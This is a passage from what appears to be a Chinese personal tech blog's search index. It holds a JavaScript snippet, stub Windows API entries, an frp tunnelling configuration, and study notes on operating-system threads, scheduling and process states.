&#123;&#125;</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;   <span class="comment">// Person &#123; name: &#x27;why&#x27; &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;why&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(p);</span><br></pre></td></tr></table></figure><hr><h2 id="内置函数的调用绑定"><a href="#内置函数的调用绑定" class="headerlink" title="内置函数的调用绑定"></a>内置函数的调用绑定</h2>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openProcess</title>
      <link href="/59bbde9c.html"/>
      <url>/59bbde9c.html</url>
      
        <content type="html"><![CDATA[<p>openProcess</p><span id="more"></span><p>openProcess 释义</p>]]></content>
      
      
      <categories>
          
          <category> Windows API </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>createProcess</title>
      <link href="/e0165a92.html"/>
      <url>/e0165a92.html</url>
      
        <content type="html"><![CDATA[<p>createProcess</p><span id="more"></span><p>createProcess 释义</p>]]></content>
      
      
      <categories>
          
          <category> Windows API </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shadowsocket配置</title>
      <link href="/fc41ab04.html"/>
      <url>/fc41ab04.html</url>
      
        <content type="html"><![CDATA[<p class='p center large'>记录一下shadowsocket的配置</p><p class='p center small'>为了愉快的使用Google</p><h3 id="国内-209-配置"><a href="#国内-209-配置" class="headerlink" title="国内[209]配置"></a>国内[209]配置</h3><details cyan><summary> 国内[209]配置 </summary>              <div class='content'>              <div class="note "><p><strong>server配置</strong></p><p>[common]<br>bind_port &#x3D; 7001</p></div><div class="note "><p><strong>client配置</strong></p><p>[common]<br>server_addr &#x3D; 127.0.0.1<br>server_port &#x3D; 7000</p><p>[ssh]<br>type &#x3D; tcp<br>local_ip &#x3D; 127.0.0.1<br>local_port &#x3D; 22<br>remote_port &#x3D; 6000</p></div>              </div>            </details><hr><h3 id="硅谷-184-配置"><a href="#硅谷-184-配置" class="headerlink" title="硅谷[184]配置"></a>硅谷[184]配置</h3><details cyan><summary> 硅谷[184]配置 </summary>              <div class='content'>              <div class="note "><p><strong>新加坡[188]server配置</strong></p><p>[common]<br>bind_port &#x3D; 7001</p></div><div class="note "><p><strong>新加披[188]client配置</strong></p><p>[common]<br>server_addr &#x3D; 国内[209]<br>server_port &#x3D; 7001</p><p>[frp_shadow]<br>type &#x3D; tcp<br>local_ip &#x3D; 127.0.0.1<br>local_port &#x3D; 8890<br>remote_port &#x3D; 8889</p><p>[frp_shh]<br>type &#x3D; tcp<br>local_ip &#x3D; 127.0.0.1<br>local_port &#x3D; 6002<br>remote_port &#x3D; 6667</p></div>              </div>            </details><hr><h3 id="新加坡-188-配置"><a href="#新加坡-188-配置" class="headerlink" title="新加坡[188]配置"></a>新加坡[188]配置</h3><details cyan><summary> 新加坡[188]配置 </summary>              <div class='content'>              <div class="note "><p><strong>server配置</strong></p><p>bind_port &#x3D; 7000</p></div><div class="note "><p><strong>新加坡[188]client配置</strong></p><p>[common]<br>server_addr &#x3D; [硅谷]184<br>server_port &#x3D; 7001</p><p>[frp_client_188]<br>type &#x3D; tcp<br>local_ip &#x3D; 1270.0.1<br>local_port &#x3D; 22<br>remote_port &#x3D; 6002</p><p>[shadowrocket_client_188]<br>type &#x3D; tcp<br>local_ip &#x3D; 127.0.0.1<br>local_port &#x3D; 8388<br>remote_port &#x3D; 8890</p></div>              </div>            </details>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统 - 调度算法的评价指标</title>
      <link href="/10785.html"/>
      <url>/10785.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>操作系统 - 调度算法的评价指标</p></blockquote><h2 id="调度算法的评价指标"><a href="#调度算法的评价指标" class="headerlink" title="调度算法的评价指标"></a>调度算法的评价指标</h2><h3 id="CPU利用率"><a href="#CPU利用率" class="headerlink" title="CPU利用率"></a>CPU利用率</h3><p><img src="/images/pasted-122.png" class="lazyload" data-srcset="/images/pasted-122.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="系统吞吐量"><a href="#系统吞吐量" class="headerlink" title="系统吞吐量"></a>系统吞吐量</h3><p><img src="/images/pasted-123.png" class="lazyload" data-srcset="/images/pasted-123.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="周转时间"><a href="#周转时间" class="headerlink" title="周转时间"></a>周转时间</h3><blockquote><p>周转时间，是指从作业被提交给系统开始，到作业完成为止的这段时间间隔<br>它包括四个部分：作业在外存后备队列上等待作业调度（高级调度）的时间、进程在就绪队列上等待进程调度（低级调度）的时间、进程在CPU上执行的时间、进程等待I&#x2F;O操作完成的时间。后三项在一个作业的整个处理过程中，可能发生多次。</p></blockquote><ul><li>周转时间 &#x3D; 作业完成时间 - 作业提交时间</li></ul><h4 id="周转时间、平均周转时间"><a href="#周转时间、平均周转时间" class="headerlink" title="周转时间、平均周转时间"></a>周转时间、平均周转时间</h4><ul><li>平均周转时间<br><img src="/images/pasted-124.png" class="lazyload" data-srcset="/images/pasted-124.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></li></ul><h4 id="带权周转时间、平均带权周转时间"><a href="#带权周转时间、平均带权周转时间" class="headerlink" title="带权周转时间、平均带权周转时间"></a>带权周转时间、平均带权周转时间</h4><p><img src="/images/pasted-125.png" class="lazyload" data-srcset="/images/pasted-125.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="等待时间"><a href="#等待时间" class="headerlink" title="等待时间"></a>等待时间</h3><ul><li>等待时间，指进程&#x2F;作业<strong>处于等待处理机状态时间之和</strong>，等待时间越长，用户满意度越低。</li><li>对于进程来说，等待时间就是指进程建立后<strong>等待被服务的时间之和</strong>，在等待I&#x2F;O完成的期间其实进程也是在被服务的，所以不计入等待时间</li><li>对于作业来说，不仅要考虑建立进程后的等待时间，还要加上作业在外存后备队列中等待的时间。</li><li>一个作业总共需要被CPU服务多久，被I&#x2F;O设备服务多久一般是确定不变的，因此调度算法其实只会影响作业&#x2F;进程的等待时间。当然，前面指标类似，也有“平均等待时间”来评价整体性能。</li></ul><h3 id="响应时间"><a href="#响应时间" class="headerlink" title="响应时间"></a>响应时间</h3><ul><li>对于计算机用户来说，会希望自己提交的请求（比如通过键盘输入了一个调试命令）尽早地开始被系统服务、回应</li><li>响应时间，指从用户提交请求到首次产生响应所用地时间。</li></ul><h3 id="知识回顾"><a href="#知识回顾" class="headerlink" title="知识回顾"></a>知识回顾</h3><p><img src="/images/pasted-126.png" class="lazyload" data-srcset="/images/pasted-126.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bilibili大学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统 - 线程概念多线程模型</title>
      <link href="/54937.html"/>
      <url>/54937.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>操作系统 - 线程概念多线程模型</p></blockquote><h2 id="线程概念多线程模型"><a href="#线程概念多线程模型" class="headerlink" title="线程概念多线程模型"></a>线程概念多线程模型</h2><h3 id="什么是线程，为什么要引入线程"><a href="#什么是线程，为什么要引入线程" class="headerlink" title="什么是线程，为什么要引入线程"></a>什么是线程，为什么要引入线程</h3><ul><li>可以把线程理解为“轻量级进程”</li><li>线程是一个<strong>基本的CPU执行单元</strong>， 也是程序执行流的最小单位</li><li>引入线程之后不仅是进程之间可以并发，进程内的各线程之间也可以并发，从而进一步提升了系统的并发度，使得一个进程内也可以并发处理各种任务</li><li>引入线程之后，进程只作为除CPU之外的系统资源的分配单元（如打印机、内存地址空间等都是分配给进程的）</li></ul><h3 id="引入线程机制后，有什么变化"><a href="#引入线程机制后，有什么变化" class="headerlink" title="引入线程机制后，有什么变化"></a>引入线程机制后，有什么变化</h3><h4 id="资源分配、调度"><a href="#资源分配、调度" class="headerlink" title="资源分配、调度"></a>资源分配、调度</h4><ul><li>传统进程机制中，进程是资源分配、调度的基本单位</li><li>引入线程后，进程是资源分配的基本单位，线程是调度的基本单位</li></ul><h4 id="并发性"><a href="#并发性" class="headerlink" title="并发性"></a>并发性</h4><ul><li>传统进程机制中，只能进程间并发</li><li>引入线程后，各线程间也能并发，提升了并发度</li></ul><h4 id="系统开销"><a href="#系统开销" class="headerlink" title="系统开销"></a>系统开销</h4><ul><li>传统的进程间并发，需要切换进程的运行环境，系统开销很大</li><li>线程间并发，如果同一进程内的线程切换，则不需要切换进程环境，系统开销小</li><li>引入线程后，并发所带来的系统开销减小</li></ul><h3 id="线程有哪些重要的属性"><a href="#线程有哪些重要的属性" class="headerlink" title="线程有哪些重要的属性"></a>线程有哪些重要的属性</h3><ul><li>线程是处理机调度的单位</li><li>多CPU计算机中，各个线程可占用不同的CPU</li><li>每个线程都有一个线程ID、线程控制块（TCB）</li><li>线程也有就绪、阻塞、运行三种状态</li><li>线程几乎并拥有系统资源</li><li>同一进程的不同线程间共享进程的资源</li><li>由于共享内存地址空间，同一进程中的线程通信甚至无需系统干预</li><li>同一进程中线程切换，不会引起进程切换</li><li>不同进程中的线程切换，会引起进程切换</li><li>切换同进程内的线程，系统开销很小</li><li>切换进程，系统开销较大</li></ul><h3 id="线程的实现方式"><a href="#线程的实现方式" class="headerlink" title="线程的实现方式"></a>线程的实现方式</h3><pre><code>在同时支持用户级线程和内核级线程的系统中，可采用二者组合的方式：将n个用户级线程映射到m个内核级线程上（n &gt; m）</code></pre><p><strong>操作系统只“看得见”内核级线程，因此只有内核级线程才是处理机？</strong></p><h4 id="用户级线程（User-Level-Thread-ULT）"><a href="#用户级线程（User-Level-Thread-ULT）" class="headerlink" title="用户级线程（User-Level Thread, ULT）"></a>用户级线程（User-Level Thread, ULT）</h4><ul><li>用户级线程由应用程序通过线程库实现。所有的<strong>线程管理工作</strong>都由<strong>应用程序负责</strong>（包括线程切换）</li><li>用户级线程中，线程切换可以在用户态下即可完成，无需操作系统干预。</li><li>在用户看来是有多个线程，但是在操作系统内核看来，是意识不到线程的存在。（用户级线程对用户不透明，对操作系统透明）</li><li><strong>“用户级线程”</strong>就是<strong>“从用户视角能看到的线程”</strong></li></ul><h4 id="内核级线程"><a href="#内核级线程" class="headerlink" title="内核级线程"></a>内核级线程</h4><ul><li>内核级线程的管理工作由操作系统内核完成。线程的调度、切换工作都由内核负责，因此内核级线程的切换必然需要在核心态下才能完成。</li><li><strong>“内核级线程”</strong>就是<strong>“从操作系统内核视角看能看到的线程”</strong></li></ul><h3 id="多线程模型"><a href="#多线程模型" class="headerlink" title="多线程模型"></a>多线程模型</h3><h4 id="多对一模型"><a href="#多对一模型" class="headerlink" title="多对一模型"></a>多对一模型</h4><blockquote><p>多个用户级线程映射到一个内核级线程。每个用户进程只对应一个内核级线程</p></blockquote><h5 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h5><pre><code>用户级线程的切换在用户空间即可完成，不需要切换至核心态，线程管理的系统开销小，效率高</code></pre><h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5><pre><code>当一个用户级线程被阻塞后，整个进程都会被阻塞，并发度不高。多个线程不可在多核处理机上并行运行</code></pre><h4 id="一对一模型"><a href="#一对一模型" class="headerlink" title="一对一模型"></a>一对一模型</h4><blockquote><p>一个用户及线程映射到一个内核级线程。每个用户进程有与用户级线程同数量的内核级线程</p></blockquote><h5 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h5><pre><code>当一个线程被阻塞后，别的线程还可以继续执行，并发能力强。多线程可在多核处理机上并行执行。</code></pre><h5 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h5><p>一个用户进程会占用多个内核级线程，线程切换由操作系统内核完成，需要切换到核心态，因此线程管理成本高，开销大。</p><h4 id="多对多模型"><a href="#多对多模型" class="headerlink" title="多对多模型"></a>多对多模型</h4><blockquote><p>n用户及线程映射到m个内核级线程（n &gt;&#x3D; m）。每个用户进程对应m个内核级线程</p></blockquote><h5 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h5><pre><code>克服了多对一模型并发度不高的缺点，又克服了一对一模型中一个用户进程占用太多内核级线程，开销太大的缺点。</code></pre><h3 id="知识回顾"><a href="#知识回顾" class="headerlink" title="知识回顾"></a>知识回顾</h3><p><img src="/images/pasted-116.png" class="lazyload" data-srcset="/images/pasted-116.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><hr><h2 id="处理机的调度"><a href="#处理机的调度" class="headerlink" title="处理机的调度"></a>处理机的调度</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><blockquote><p>1.当一堆任务要处理，但由于资源有限，这些事情没法同时处理。这就需要确定某种规则来决定处理这些任务的顺序。<br>2.在多道程序系统中，进程的数量往往是多余处理机的个数的，这样不可能同时并行地处理各个进程。<strong>处理机调度</strong>，就是从就绪队列中按照一定地算法选择一个进程并将处理机分配给它运行，以实现进程地并发执行。</p></blockquote><h3 id="三个层次"><a href="#三个层次" class="headerlink" title="三个层次"></a>三个层次</h3><h4 id="高级调度（作业调度）"><a href="#高级调度（作业调度）" class="headerlink" title="高级调度（作业调度）"></a>高级调度（作业调度）</h4><ol><li>由于内存空间有限，有时无法将用户提交的作业全部放入内存，因此就需要确定某种规则来决定将作业调入内存的顺序</li><li><strong>高级调度（作业调度）</strong>。按一定的原则从外存上处于后备队列的作业中挑选一个（或多个）作业，给他们分配内存等必要资源，并<strong>建立相应进程（建立PCB）</strong>，以使它（们）<strong>获得竞争处理机的权利</strong>。</li><li>高级调度是辅存（外存）与内存之间的调度。每个作业只调入一次，调出一次。<strong>作业调入时会建立相应的PCB，作业调出时才撤销PCB</strong>。高级调度主要是指调入的问题，因为只有调入的时机需要操作系统来确定，但调出的时机必然是作业运行结束才调出。</li></ol><h4 id="中级调度（内存调度）"><a href="#中级调度（内存调度）" class="headerlink" title="中级调度（内存调度）"></a>中级调度（内存调度）</h4><ol><li>引入了虚拟存储技术之后，可将暂时不能运行的进程调至外存等待。等它重新具备了运行条件且内存又稍有空闲，再重新调入内存。这么做的目的是为了提高内存利用率和系统吞吐量。</li><li>暂时调到外存等待的进程状态为<strong>挂起状态</strong>，值得注意的是，PCB并不会一起调到外存，而是会常驻内存。PCB中会记录进程数据在外存中的存放位置，进程状态等信息，操作系统通过内存中的PCB来保持对各个进程的监控、管理。被挂起的进程PCB会被放到挂起队列中。</li><li>中级调度（内存调度），就是要决定将哪个处于挂起状态的进程重新调入内存。一个进程可能会被多次调出、调出内存，因此中级调度发生的频率要比高级调度更高。</li></ol><h4 id="低级调度（进程调度）"><a href="#低级调度（进程调度）" class="headerlink" title="低级调度（进程调度）"></a>低级调度（进程调度）</h4><ol><li>低级调度（进程调度），其主要任务是按照某种方法和策略从就绪队列中选取一个进程，将处理机分配给它。，</li><li>进程调度是操作系统中最基本的一种调度，在一般的操作系统中都必须配置进程调度。进程调度的频率很高，一般几十毫秒一次。</li></ol><h3 id="三层调度的联系、对比"><a href="#三层调度的联系、对比" class="headerlink" title="三层调度的联系、对比"></a>三层调度的联系、对比</h3><p><img src="/images/pasted-118.png" class="lazyload" data-srcset="/images/pasted-118.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h3><h4 id="进程的“挂起态”"><a href="#进程的“挂起态”" class="headerlink" title="进程的“挂起态”"></a>进程的“挂起态”</h4><ul><li>暂时调到外存等待的进程状态为挂起状态（挂起态，suspend）</li><li>挂起态又可以进一步细分为就绪挂起、阻塞挂起两中状态</li></ul><h4 id="七状态模型"><a href="#七状态模型" class="headerlink" title="七状态模型"></a>七状态模型</h4><p><img src="/images/pasted-117.png" class="lazyload" data-srcset="/images/pasted-117.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="知识回顾-1"><a href="#知识回顾-1" class="headerlink" title="知识回顾"></a>知识回顾</h3><p><img src="/images/pasted-119.png" class="lazyload" data-srcset="/images/pasted-119.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><hr><h2 id="进程调度的时机切换与过程调度方式"><a href="#进程调度的时机切换与过程调度方式" class="headerlink" title="进程调度的时机切换与过程调度方式"></a>进程调度的时机切换与过程调度方式</h2><h3 id="时机"><a href="#时机" class="headerlink" title="时机"></a>时机</h3><p><img src="/images/pasted-120.png" class="lazyload" data-srcset="/images/pasted-120.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h4 id="什么时候需要进程调度"><a href="#什么时候需要进程调度" class="headerlink" title="什么时候需要进程调度"></a>什么时候需要进程调度</h4><h5 id="当前运行的进程主动放弃处理机"><a href="#当前运行的进程主动放弃处理机" class="headerlink" title="当前运行的进程主动放弃处理机"></a>当前运行的进程主动放弃处理机</h5><ol><li>进程正常终止</li><li>运行过程中发生异常而终止</li><li>进程主动请求阻塞（如 等待I&#x2F;O）</li></ol><h5 id="当前运行的进程被动放弃处理机"><a href="#当前运行的进程被动放弃处理机" class="headerlink" title="当前运行的进程被动放弃处理机"></a>当前运行的进程被动放弃处理机</h5><ol><li>分给进程的时间片用完</li><li>有更紧急的事需要处理（如I&#x2F;O中断）</li><li>有更高优先级的进程进入就绪队列</li></ol><h4 id="什么时候不能进行进程调度"><a href="#什么时候不能进行进程调度" class="headerlink" title="什么时候不能进行进程调度"></a>什么时候不能进行进程调度</h4><ol><li>在处理中断的过程中，中断处理过程复杂，与硬件密切相关，很难做到在中断处理过程中进行进程切换</li><li>进程在操作系统内核程序临界区中</li><li>在原子操作过程中（原语）。原子操作不可中断，要一气呵成（如 修改PCB中进程状态标志，并把PCB放到相应队列）</li></ol><h3 id="切换与过程"><a href="#切换与过程" class="headerlink" title="切换与过程"></a>切换与过程</h3><h4 id="“狭义的调度”与“切换”的区别"><a href="#“狭义的调度”与“切换”的区别" class="headerlink" title="“狭义的调度”与“切换”的区别"></a>“狭义的调度”与“切换”的区别</h4><ul><li><p><strong>狭义的进程调度</strong>指的是从就绪队列中选中一个要运行的进程。（这个进程可以是刚刚被暂停执行的进程，也可能是另一个进程，后一种情况就需要进程切换）</p></li><li><p><strong>进程切换</strong>是指一个进程让出处理机，由另一个进程占用处理机的过程。</p></li><li><p><strong>广义的进程调度</strong>包含了选择一个进程和进程切换两个步骤。</p></li><li><p>进程切换的过程主要完成了：</p><ol><li>对原来运行进程各种数据的保存</li><li>对新进程各种数据的恢复（如：程序计数器、程序状态字、各种数据寄存器等处理机现场信息，这些信息一般保存在进程控制块）</li></ol></li><li><p><strong>注意：</strong>进程切换是有代价的，因此如果过于频繁的进行进程调度、切换，必然会使整个系统的效率降低，是系统大部分时间都花在了进程切换上，而真正用于执行进程的时间减少。</p></li></ul><h4 id="进程切换的过程需要做什么"><a href="#进程切换的过程需要做什么" class="headerlink" title="进程切换的过程需要做什么"></a>进程切换的过程需要做什么</h4><h3 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h3><h4 id="非剥夺调度式（非抢占式）"><a href="#非剥夺调度式（非抢占式）" class="headerlink" title="非剥夺调度式（非抢占式）"></a>非剥夺调度式（非抢占式）</h4><ul><li>非剥夺调度方式，又称非抢占方式。即，只允许进程主动放弃处理机。在运行过程中即便有更紧迫的任务到达，当前进程依然会继续使用处理机，直到该进程终止或主动要求进入阻塞态</li><li>实现简单，系统开销小但是无法及时处理紧急任务，适合于早期的批处理系统</li></ul><h4 id="剥夺调度方式（抢占式）"><a href="#剥夺调度方式（抢占式）" class="headerlink" title="剥夺调度方式（抢占式）"></a>剥夺调度方式（抢占式）</h4><ul><li>剥夺调度方式，又称抢占方式。当一个进程正在处理机上执行时，如果有一个更重要或更紧迫的进程需要使用处理机，则立即暂停正在执行的过程，将处理机分配给更重要紧迫的那个进程。</li><li>可以优先处理更紧急的进程，也可以实现让各进程按时间片轮流执行的功能（通过时钟中断）。适合于分时操作系统、实时操作系统。</li></ul><h3 id="知识回顾-2"><a href="#知识回顾-2" class="headerlink" title="知识回顾"></a>知识回顾</h3><p><img src="/images/pasted-121.png" class="lazyload" data-srcset="/images/pasted-121.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bilibili大学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统 - 进程的状态与转换</title>
      <link href="/60210.html"/>
      <url>/60210.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>操作系统的状态与转换</p></blockquote><h2 id="操作系统的状态与转换"><a href="#操作系统的状态与转换" class="headerlink" title="操作系统的状态与转换"></a>操作系统的状态与转换</h2><h3 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h3><blockquote><p>进程是程序的一次执行。在这个执行过程中，有时进程正在被CPU处理，有时又需要等待CPU服务，可见进程的状态是会有各种变化的，为了方便对各个进程的管理，操作系统需要将进程合理地划分为几种状态</p></blockquote><h4 id="运行态（Running）"><a href="#运行态（Running）" class="headerlink" title="运行态（Running）"></a>运行态（Running）</h4><blockquote><p>单核处理机环境下，每一个时刻最多只有一个进程处于运行态。（双核环境下可以同时有两个进程处于运行态）</p></blockquote><ul><li>占有CPU，并在CPU上运行</li></ul><h4 id="就绪态（Ready）"><a href="#就绪态（Ready）" class="headerlink" title="就绪态（Ready）"></a>就绪态（Ready）</h4><blockquote><p>进程已经拥有了除处理机之外所有需要地资源，一旦获得处理机，即可立即进入运行态开始运行</p></blockquote><ul><li>已经具备运行条件，但由于没有空闲CPU，而暂时不能运行</li></ul><h4 id="阻塞态（Waiting-x2F-Blocked，又称：等待态）"><a href="#阻塞态（Waiting-x2F-Blocked，又称：等待态）" class="headerlink" title="阻塞态（Waiting&#x2F;Blocked，又称：等待态）"></a>阻塞态（Waiting&#x2F;Blocked，又称：等待态）</h4><blockquote><p>等待操作系统分配打印机、等待读磁盘操作地结果。CPU是计算机中最昂贵地部件，为了提高CPU地利用率，需要先将其他进程需要的资源分配到位，才能得到CPU的服务</p></blockquote><ul><li>因等待某一事件而暂时不能运行</li></ul><h4 id="创建态（New，又称：新建态）"><a href="#创建态（New，又称：新建态）" class="headerlink" title="创建态（New，又称：新建态）"></a>创建态（New，又称：新建态）</h4><blockquote><p>操作系统需要完成创建进程。操作系统为该进程分配所需的内存空间等系统资源，并为其创建、初始化PCB</p></blockquote><ul><li>进程正在被创建，操作系统为进程分配资源、初始化PCB</li></ul><h4 id="终止态（Terminated，又称：结束态）"><a href="#终止态（Terminated，又称：结束态）" class="headerlink" title="终止态（Terminated，又称：结束态）"></a>终止态（Terminated，又称：结束态）</h4><blockquote><p>进程运行结束（或者由于bug导致进程无法继续执行下去，比如数组越界错误），需要撤销进程。操作系统需要完成撤销进程相关的工作。完成将分配给进程的资源回收，撤销进程PCB等工作</p></blockquote><ul><li>进程正在从系统中撤销，操作系统会回收进程拥有的资源、撤销PCB</li></ul><h3 id="进程状态间的转换"><a href="#进程状态间的转换" class="headerlink" title="进程状态间的转换"></a>进程状态间的转换</h3><h4 id="就绪态-x3D-gt-运行态"><a href="#就绪态-x3D-gt-运行态" class="headerlink" title="就绪态 &#x3D;&gt; 运行态"></a>就绪态 &#x3D;&gt; 运行态</h4><ul><li>拥有除处理机外的所有需要的资源</li><li>进程被调度</li></ul><h4 id="运行态-x3D-gt-就绪态"><a href="#运行态-x3D-gt-就绪态" class="headerlink" title="运行态 &#x3D;&gt; 就绪态"></a>运行态 &#x3D;&gt; 就绪态</h4><ul><li>时间片到或处理机被抢占</li></ul><h4 id="运行态-x3D-gt-阻塞态"><a href="#运行态-x3D-gt-阻塞态" class="headerlink" title="运行态 &#x3D;&gt; 阻塞态"></a>运行态 &#x3D;&gt; 阻塞态</h4><ul><li>进程用“系统调用”的方式申请某种系统资源，或者请求等待某个事件发生</li><li>是一种进程自身做出的<strong>主动行为</strong></li></ul><h4 id="阻塞态-x3D-gt-就绪态"><a href="#阻塞态-x3D-gt-就绪态" class="headerlink" title="阻塞态 &#x3D;&gt; 就绪态"></a>阻塞态 &#x3D;&gt; 就绪态</h4><ul><li>申请的资源被分配，或等待的事件发生</li><li>不是进程自身能控制的，是一种<strong>被动行为</strong></li></ul><blockquote><p><strong>注意：不能由阻塞态直接转换为运行态，也不能由就绪态直接转换为阻塞态</strong>（因为进入阻塞态是进程主动请求的，必然需要进程在运行时才能发出这种请求）</p></blockquote><h3 id="知识回顾"><a href="#知识回顾" class="headerlink" title="知识回顾"></a>知识回顾</h3><p><img src="/images/pasted-112.png" class="lazyload" data-srcset="/images/pasted-112.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><hr><h2 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><h4 id="什么是进程控制"><a href="#什么是进程控制" class="headerlink" title="什么是进程控制"></a>什么是进程控制</h4><blockquote><p>进程控制就是要实现进程状态的转换</p></blockquote><ul><li>进程控制的主要功能是对系统中的所有进程实施有效的管理，它具有创建新进程、撤销已有进程、实现进程状态转换等功能</li></ul><h4 id="如何实现进程控制"><a href="#如何实现进程控制" class="headerlink" title="如何实现进程控制"></a>如何实现进程控制</h4><p><img src="/images/pasted-113.png" class="lazyload" data-srcset="/images/pasted-113.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="进程控制相关的原语"><a href="#进程控制相关的原语" class="headerlink" title="进程控制相关的原语"></a>进程控制相关的原语</h3><blockquote><ul><li>用原语实现进程控制。原语的特点是执行期间<strong>不允许中断</strong>，只能一气呵成。这种不可被中断的操作即<strong>原子操作</strong>。原语采用“关中断指令”和“开中断指令”实现。</li><li>关&#x2F;开中断指令的权限非常大，必然是只允许在<strong>核心态</strong>下执行的<strong>特权指令</strong></li></ul></blockquote><p><strong>进程控制会导致进程状态的转换。无论哪个原语，要做的无非三类事情：</strong></p><ol><li><p>更新PCB中的信息（如修改进程状态标志、将运行环境保存到PCB、从PCB恢复运行环境）<br> a. 所有的进程控制原语一定都会修改进程状态标志<br> b. 剥夺当前运行进程的CPU使用权必然需要保存其运行环境<br> c.某进程开始运行前必然要恢复其运行环境</p></li><li><p>将PCB插入合适的队列</p></li><li><p>分配&#x2F;回收资源</p></li></ol><h4 id="进程的创建"><a href="#进程的创建" class="headerlink" title="进程的创建"></a>进程的创建</h4><h5 id="创建原语"><a href="#创建原语" class="headerlink" title="创建原语"></a>创建原语</h5><ul><li>申请空白PCB</li><li>为新进程分配所需资源</li><li>初始化PCB</li><li>将PCB插入就绪队列</li></ul><h5 id="引起进程创建的事件"><a href="#引起进程创建的事件" class="headerlink" title="引起进程创建的事件"></a>引起进程创建的事件</h5><ul><li><p>用户登录</p><ul><li>分时系统中，用户登录成功，系统会为其建立一个新进程</li></ul></li><li><p>作业调度</p><ul><li>多道批处理系统中，有新的作业放入内存时，会为其建立一个新的进程</li></ul></li><li><p>提供服务</p><ul><li>用户向操作系统提出某些请求时，会建立一个进程处理该请求</li></ul></li><li><p>应用请求</p><ul><li>由用户进程主动请求创建一个子进程</li></ul></li></ul><h4 id="进程的终止"><a href="#进程的终止" class="headerlink" title="进程的终止"></a>进程的终止</h4><h5 id="撤销原语"><a href="#撤销原语" class="headerlink" title="撤销原语"></a>撤销原语</h5><ul><li>从PCB集合中找到终止进程的PCB</li><li>若进程正在运行，立即剥夺CPU，将CPU分配给其他进程</li><li>终止其所有子进程</li><li>将该进程拥有的所有资源归还给父进程或操作系统</li><li>删除PCB</li></ul><h5 id="引起进程终止的事件"><a href="#引起进程终止的事件" class="headerlink" title="引起进程终止的事件"></a>引起进程终止的事件</h5><ul><li>正常结束</li><li>异常结束</li><li>外界干预</li></ul><h4 id="进程的阻塞"><a href="#进程的阻塞" class="headerlink" title="进程的阻塞"></a>进程的阻塞</h4><h5 id="阻塞原语"><a href="#阻塞原语" class="headerlink" 